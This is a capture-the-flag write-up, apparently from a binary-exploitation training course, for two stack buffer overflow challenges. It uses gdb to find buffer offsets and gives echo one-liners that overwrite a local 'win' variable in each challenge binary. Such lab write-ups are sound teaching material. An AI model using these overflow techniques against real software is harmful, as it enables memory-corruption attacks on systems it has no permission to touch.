# Variable Control

## Variable Control (easy)

As told in the debug output, the win variable is 64 bytes from input buffer and has to be set to 0x6eb781f0

```shell
echo -e -n "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf0\x81\xb7\x6e" | /challenge/binary-exploitation-var-control-w
```

## Variable Controle (hard)

1. In gdb, `disas challenge`, we get to know:
    - win is at **rbp-0x18** = rbp-24
    - lose is at **rbp-0x14** = rbp-20
    - win has to be changed to **0x5a3c1e5a**

2. Set a breakpoint `b *challenge+163`, run and give a long string of a's as input
3. `info frame` -> rbp is at **0x7ffcc2692280**
4. `x/100xg $rbp-200` -> input buffer starts at **0x7ffcc2692230**, which is **rbp-0x50** = rbp-80
5. 56 a's followed by desired value:

    ```shell
    echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x5a\x1e\x3c\x5a" | /challenge/binary-exploitation-var-control 
    ```
